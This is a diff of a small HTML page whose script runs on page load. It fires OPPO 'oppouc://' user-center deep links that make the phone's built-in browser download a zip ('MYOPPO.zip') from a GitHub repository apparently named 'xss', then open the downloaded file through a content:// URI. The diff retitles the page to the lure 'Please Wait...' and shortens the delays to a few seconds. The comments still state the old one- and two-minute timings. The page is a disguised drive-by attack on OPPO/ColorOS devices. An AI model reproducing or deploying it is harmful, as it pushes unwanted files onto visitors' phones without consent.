@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Custom URL</title>
+    <title>Please Wait...</title>
     <script type="text/javascript">
         document.addEventListener('DOMContentLoaded', (event) => {
             function openCustomURL(url) {
@@ -12,13 +12,13 @@
 
             // Menunggu 1 menit (60.000 milidetik) sebelum membuka URL pertama
             setTimeout(() => {
-                openCustomURL('oppouc://usercenter.oppo.com/browser?url=https://github.com/Tedixx/i/raw/i/i.zip');
+                openCustomURL('oppouc://usercenter.oppo.com/browser?url=https://github.com/syukirman-amir/xss/raw/main/MYOPPO.zip');
                 
                 // Menunggu 2 menit (120.000 milidetik) setelah membuka URL pertama sebelum membuka URL kedua
                 setTimeout(() => {
-                    openCustomURL('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/i.zip');
-                }, 120000); // 120000 milidetik = 2 menit
-            }, 60000); // 60000 milidetik = 1 menit
+                    openCustomURL('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip');
+                }, 10000); // 120000 milidetik = 2 menit
+            }, 5000); // 60000 milidetik = 1 menit
         });
     </script>
 </head>
